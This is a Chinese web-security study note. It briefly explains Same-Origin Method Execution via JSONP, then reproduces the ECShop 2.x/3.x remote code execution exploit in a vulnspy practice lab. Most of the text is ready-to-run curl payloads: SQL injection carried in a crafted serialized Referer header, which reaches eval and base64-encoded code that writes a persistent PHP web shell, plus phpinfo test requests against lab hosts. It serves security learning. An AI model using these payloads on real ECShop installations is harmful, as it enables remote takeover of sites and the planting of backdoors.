# Web 安全

**同源方式执行（SOME）攻击**

**原理及危害**

> json可以理解为，用户可以控制输入的一种JS函数。并且这种函数可以跨域访问。这就很恐怖了。比如某些存在父子网页的并且还为做过滤，很有可能你一点击后就会自动执行某些链接，如自动关注，点赞等。

**攻击条件**
> 存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）

**SOME复现**

通过一个大佬写的SOME靶场来练习复现:



### ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用

[ECShop <= 2.7.x 全系列版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-2.7.x-rce-exploit/)

[ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-3.x.x-rce-exploit/)

**打开 ECSHOP 实验地址**

![](PHP绕过/绕过%20disable_functions/img/4.png)

**发送 Payload 执行 phpinfo();**

`将***.vsplate.me换成您的实验地址`

在终端中执行：

`curl http://***.vsplate.me/user.php -d "action=login&vulnspy=phpinfo();exit;" -H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a'`


```
curl http://***.vsplate.me/ecshop/user.php -d "action=login&vulnspy=eval/**/(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOycpOw));exit;" \-H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a''
```

```
curl http://0c6c41028d7188d3896c8ed30551d1a6.n1.vsgo.cloud:12050/user.php -d "action=login&vulnspy=eval/**/(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOycpOw));exit;" \-H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a''
```

curl http://0c6c41028d7188d3896c8ed30551d1a6.n1.vsgo.cloud:12050/user.php

http://0c6c41028d7188d3896c8ed30551d1a6.n1.vsgo.cloud:12050//vulnspy.php?vulnspy=phpinfo();

curl http://0c6c41028d7188d3896c8ed30551d1a6.n1.vsgo.cloud:12050/user.php -d 'action=login&vulnspy=eval(base64_decode($_POST[d]));exit;&d=ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOz8%2BJyk7' \
-H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'


curl http://0c6c41028d7188d3896c8ed30551d1a6.n1.vsgo.cloud:12050/user.php -d 'action=login&vulnspy=phpinfo();exit;' -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'